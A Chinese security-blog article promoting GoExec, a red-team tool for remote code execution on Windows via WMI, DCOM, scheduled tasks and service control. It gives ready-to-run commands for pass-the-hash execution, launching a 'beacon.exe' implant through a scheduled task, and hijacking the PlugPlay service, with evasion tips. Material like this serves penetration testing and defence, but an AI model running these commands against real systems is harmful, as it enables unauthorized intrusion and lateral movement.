#  红队福音：GoExec实现多种Windows远程代码执行方法  
 柠檬赏金猎人   2026-03-06 00:17  
  
### 概述  

  
GoExec是一款用Go语言编写的Windows远程执行多合一工具，它实现了多种远程执行方法，并对操作安全性（OPSEC）进行了显著改进。该工具支持WMI、DCOM、SCMR和TSCH等多种协议，为安全研究人员和红队人员提供了灵活且隐蔽的远程代码执行能力。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KysoJFiczHUsoicEk7ZYCnr7717YfHlg4eFk2cIibRJibV5W5kXdejibnjrzT1UicWqRykdof5ZetZpNwUCe8DSvckRdYfTpNEdoxbibXfVwm2BFwk/640?wx_fmt=png "")  

### 技术/功能  

  
GoExec的核心功能模块如下：  

<table>
<thead>
<tr>
<th><span style="font-size: 14px;">模块名称</span></th>
<th><span style="font-size: 14px;">主要功能</span></th>
<th><span style="font-size: 14px;">关键特性</span></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong style="color: rgb(0, 150, 136);font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;margin: 0px;padding: 0px;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;font-size: 14px;">WMI模块</strong></td>
<td><span style="font-size: 14px;">通过Windows管理规范远程执行</span></td>
<td><span style="font-size: 14px;">支持进程创建和自定义方法调用</span></td>
</tr>
<tr>
<td><strong style="color: rgb(0, 150, 136);font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;margin: 0px;padding: 0px;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;font-size: 14px;">DCOM模块</strong></td>
<td><span style="font-size: 14px;">利用分布式组件对象模型执行</span></td>
<td><span style="font-size: 14px;">支持MMC、ShellWindows、Excel等多种对象</span></td>
</tr>
<tr>
<td><strong style="color: rgb(0, 150, 136);font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;margin: 0px;padding: 0px;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;font-size: 14px;">TSCH模块</strong></td>
<td><span style="font-size: 14px;">通过任务计划程序服务执行</span></td>
<td><span style="font-size: 14px;">支持创建、修改和即时启动任务</span></td>
</tr>
<tr>
<td><strong style="color: rgb(0, 150, 136);font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;margin: 0px;padding: 0px;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;font-size: 14px;">SCMR模块</strong></td>
<td><span style="font-size: 14px;">通过服务控制管理器执行</span></td>
<td><span style="font-size: 14px;">支持创建、修改和删除服务</span></td>
</tr>
</tbody>
</table>
  
**主要特性：**  

- 支持多种认证方式：密码、NT哈希、Kerberos、证书等  
  
- 可选的执行输出捕获功能（通过SMB传输）  
  
- 支持代理和自定义RPC端点  
  
- 提供详细的调试和日志记录选项  
  

### 使用示例  

#### 1. 使用WMI模块执行命令  

```
# 使用NT哈希认证，执行whoami命令并获取输出goexec wmi proc "192.168.1.100" \  -u "administrator@domain" \  -H "aad3b435b51404eeaad3b435b51404ee" \  -e "cmd.exe" \  -a "/C whoami /all" \  -o-
```  

#### 2. 使用DCOM的MMC方法  

```
# 执行系统命令并保存输出到文件goexec dcom mmc "target-host" \  -u "admin" \  -p "Password123" \  -e "cmd.exe" \  -a "/c systeminfo" \  -o ./systeminfo.txt
```  

#### 3. 使用任务计划程序模块  

```
# 创建定时任务执行程序goexec tsch create "192.168.1.50" \  -u "user@domain" \  -p "password" \  --kerberos \  --task "\\Microsoft\\Windows\\GoExec" \  --exec "C:\\Windows\\Temp\\beacon.exe"
```  

#### 4. 修改现有服务执行命令  

```
# 修改PlugPlay服务执行自定义命令goexec scmr change "target" \  -u "administrator" \  -p "AdminPass123" \  -s "PlugPlay" \  -f "C:\\Windows\\System32\\cmd.exe" \  -a "/c echo Hello > C:\\test.txt"
```  

### 注意事项  

1. **合法使用**：仅限授权测试和合法安全研究使用  
  
1. **OPSEC考虑**：输出捕获功能会在目标系统创建临时文件，可能被安全软件检测  
  
1. **DCOM限制**：DCOM模块在某些Windows版本上可能不稳定，且不支持Kerberos认证  
  
1. **服务修改风险**：修改关键Windows服务可能导致系统不稳定  
  
1. **时间同步**：TSCH模块需要目标系统时间同步准确  
  
1. **权限要求**：大多数方法需要管理员权限才能成功执行  
  

### 参考链接  

- https://github.com/FalconOpsLLC/goexec  
  
- https://www.falconops.com/blog/introducing-goexec  
  
- https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/  
  


  
仅限交流学习使用，如您在使用本工具或代码的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。如侵权请私聊公众号删文。  

  
  
